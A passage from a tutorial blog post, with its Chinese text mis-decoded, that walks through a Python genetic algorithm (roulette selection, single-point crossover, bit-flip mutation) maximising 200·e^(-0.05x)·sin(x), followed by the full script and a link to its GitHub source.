punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="å®šä¹‰å˜å¼‚æ–¹æ³•"><a href="#å®šä¹‰å˜å¼‚æ–¹æ³•" class="headerlink" title="å®šä¹‰å˜å¼‚æ–¹æ³•"></a>å®šä¹‰å˜å¼‚æ–¹æ³•</h2><blockquote><p>å³ä½¿åŸºå› çªå˜çš„æ¦‚ç‡æå°ï¼Œä½†ä¹Ÿéœ€è¦å®šä¹‰ä¸€ä¸ªåŸºå› çªå˜æ–¹æ³•ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#å˜å¼‚ç®—å­</span><span class="token comment" spellcheck="true">#offspringä¸ºäº¤å‰åçš„ç§ç¾¤ï¼Œpmä¸ºåŸºå› å˜å¼‚æ¦‚ç‡</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring</code></pre></blockquote><h2 id="å¼€å§‹è¿­ä»£è¿›åŒ–"><a href="#å¼€å§‹è¿­ä»£è¿›åŒ–" class="headerlink" title="å¼€å§‹è¿­ä»£è¿›åŒ–"></a>å¼€å§‹è¿­ä»£è¿›åŒ–</h2><blockquote><p>ä¸»å‡½æ•°å¦‚ä¸‹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#é€šè¿‡matplotlibåº“ç»˜å‡ºå‡½æ•°å›¾å½¢</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             arrowprops=dict(facecolor='black', shrink=0.05),</span>    <span class="token comment" spellcheck="true">#             )</span>    <span class="token comment" spellcheck="true"># plt.show()</span>    population <span class="token operator">=</span> Init_popu<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    X<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    Y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(DNAdict)</span>        new_population <span class="token operator">=</span> selection<span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#crossover äº¤å‰</span>        offspring <span class="token operator">=</span>crossover<span class="token punctuation">(</span>new_population<span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#mutation å˜å¼‚</span>        population<span class="token operator">=</span>mutation<span class="token punctuation">(</span>offspring<span class="token punctuation">,</span><span class="token number">0.001</span><span class="token punctuation">)</span>        population<span class="token punctuation">,</span>Dpopulation <span class="token operator">=</span> Decode<span class="token punctuation">(</span>population<span class="token punctuation">)</span>        y<span class="token punctuation">,</span>population <span class="token operator">=</span> gafunction<span class="token punctuation">(</span>population<span class="token punctuation">,</span>Dpopulation<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡å¹³å‡å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        meannum <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡æœ€å°å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        minnum <span class="token operator">=</span> min<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#é€šè¿‡æœ€å¤§å€¼è¡¨ç¤ºè¿­ä»£è¿›åŒ–</span>        maxnum <span class="token operator">=</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>minnum<span class="token punctuation">)</span>        Y1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>meannum<span class="token punctuation">)</span>        Y2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maxnum<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y2<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>FuncMax<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    </code></pre><p>é—ä¼ ç®—æ³•å®ä¾‹è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018180316.png" class="lazyload"></p><blockquote><p>ç°åœ¨å¯¹é—ä¼ ç®—æ³•ä¹Ÿå¤§æ¦‚æœ‰ä¸ªç®€å•çš„äº†è§£å•¦ï¼Œæš‚æ—¶åˆ°è¿™å„¿ã€‚</p></blockquote><p>é™„ä¸Šå®Œæ•´ä»£ç ï¼š<a href="https://github.com/Yof3ng/algorithm/blob/master/SGA.py" target="_blank" rel="noopener">https://github.com/Yof3ng/algorithm/blob/master/SGA.py</a></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">def</span> <span class="token function">FuncMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    xx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>    yy<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#é€šè¿‡å¾ªç¯è®¡ç®—æ¯ä¸€ä¸ªxå€¼å¯¹åº”çš„yå€¼</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> xx<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>ii<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token punctuation">)</span>        yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">return</span> max<span class="token punctuation">(</span>yy<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ ¹æ®å‡½æ•°åŸå‹è®¡ç®—è¡¨ç°å‹ï¼ˆyå€¼)ï¼Œå³é€‚åº”åº¦</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#é€šè¿‡å¾ªç¯è®¡ç®—æ¯ä¸€ä¸ªxå€¼å¯¹åº”çš„yå€¼</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#ç”±äºæ˜¯è®¡ç®—æœ€å¤§å€¼ï¼Œè‹¥å­˜åœ¨æ­£æ•°åˆ™ç›´æ¥å»é™¤è´Ÿæ•°ä¸ªä½“</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population<span class="token comment" spellcheck="true">#è§£ç </span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#print(population)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#å°†äºŒè¿›åˆ¶è½¬æ¢ä¸ºæ•´å‹æ•°å€¼</span>        x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>        Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>        <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>    <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation    <span class="token comment" spellcheck="true">#return express</span>    <span class="token comment" spellcheck="true"># print(bx[0:100])</span>    <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span><span class="token comment" spellcheck="true">#åˆå§‹åŒ–ä¸ªä½“</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population<span class="token comment" spellcheck="true">#å®šä¹‰ç‰©ç«å¤©æ‹©,å¼±è€…æ·˜æ±°</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#è½®ç›˜èµŒé€‰æ‹©,æŸ“è‰²ä½“ç´¯è®¡æ¦‚ç‡</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#è¿›è¡Œé€‰æ‹©ï¼Œæ·˜æ±°å¼±è€…ï¼Œè·å–æ–°ç§ç¾¤</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ç•™ä¸‹ä¼˜ç§€ä¸ªä½“</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span><span class="token comment" spellcheck="true">#äº¤å‰ç®—å­</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>son<span class="token punctuation">)</span>        offspring<span class="token punctuation">.</span>append<span class="token punctuation">(</span>daughter<span class="token punctuation">)</span>    <span class="token keyword">return</span> offspring<span class="token comment" spellcheck="true">#å˜å¼‚ç®—å­</span><span class="token keyword">def</span> <span class="token function">mutation</span><span class="token punctuation">(</span>offspring<span class="token punctuation">,</span>pm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pm<span class="token punctuation">:</span>            position<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#'str' object does not support item assignment,cannot use = to change value</span>            <span class="token keyword">if</span> position<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>position<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span>offspring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> offspring<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#é€šè¿‡matplotlibåº“ç»˜å‡ºå‡½æ•°å›¾å½¢</span>    <span class="token comment" spellcheck="true"># plt.plot(x,y)</span>    <span class="token comment" spellcheck="true"># plt.annotate('local max', xy=(1.4, max(y)), xytext=(0, 200),</span>    <span class="token comment" spellcheck="true">#             